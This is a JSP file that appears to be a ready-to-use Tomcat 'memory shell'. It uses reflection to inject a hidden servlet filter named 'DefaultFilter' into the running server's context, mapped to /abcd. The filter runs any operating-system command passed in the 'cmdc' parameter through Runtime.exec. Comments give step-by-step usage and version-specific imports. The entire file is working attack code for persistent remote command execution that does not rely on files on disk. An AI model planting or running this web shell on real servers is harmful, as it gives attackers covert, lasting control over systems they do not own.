<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import = "org.apache.catalina.Context" %>
<%@ page import = "org.apache.catalina.core.ApplicationContext" %>
<%@ page import = "org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import = "org.apache.catalina.core.StandardContext" %>

<!-- tomcat 8/9 -->
<!-- page import = "org.apache.tomcat.util.descriptor.web.FilterMap"
page import = "org.apache.tomcat.util.descriptor.web.FilterDef" -->

<!-- tomcat 7 -->
<%@ page import = "org.apache.catalina.deploy.FilterMap" %>
<%@ page import = "org.apache.catalina.deploy.FilterDef" %>


<%@ page import = "javax.servlet.*" %>
<%@ page import = "javax.servlet.annotation.WebServlet" %>
<%@ page import = "javax.servlet.http.HttpServlet" %>
<%@ page import = "javax.servlet.http.HttpServletRequest" %>
<%@ page import = "javax.servlet.http.HttpServletResponse" %>
<%@ page import = "java.io.IOException" %>
<%@ page import = "java.lang.reflect.Constructor" %>
<%@ page import = "java.lang.reflect.Field" %>
<%@ page import = "java.lang.reflect.InvocationTargetException" %>
<%@ page import = "java.util.Map" %>


<!-- 1 revise the import class with correct tomcat version -->
<!-- 2 request this jsp file -->
<!-- 3 request xxxx/this file/../abcd?cmdc=calc -->

<%

class DefaultFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        if (req.getParameter("cmdc") != null) {

            Runtime.getRuntime().exec(req.getParameter("cmdc"));
            response.getWriter().println("exec done");

        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    public void destroy() {}
                
}
%>


<%
String name = "DefaultFilter";

ServletContext servletContext =  request.getSession().getServletContext();

Field appctx = servletContext.getClass().getDeclaredField("context"); 
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); 
Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); 
Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
Configs.setAccessible(true);
Map filterConfigs = (Map) Configs.get(standardContext);


if (filterConfigs.get(name) == null){
    DefaultFilter filter = new DefaultFilter();

    FilterDef filterDef = new FilterDef();
    filterDef.setFilterName(name);
    filterDef.setFilterClass(filter.getClass().getName());
    filterDef.setFilter(filter);
    standardContext.addFilterDef(filterDef);

    FilterMap filterMap = new FilterMap();
    // filterMap.addURLPattern("/*");
    filterMap.addURLPattern("/abcd");
    filterMap.setFilterName(name);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    standardContext.addFilterMapBefore(filterMap);


    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

    filterConfigs.put(name, filterConfig);
    out.write("Inject success!");
}
else{
    out.write("Injected");
}
%>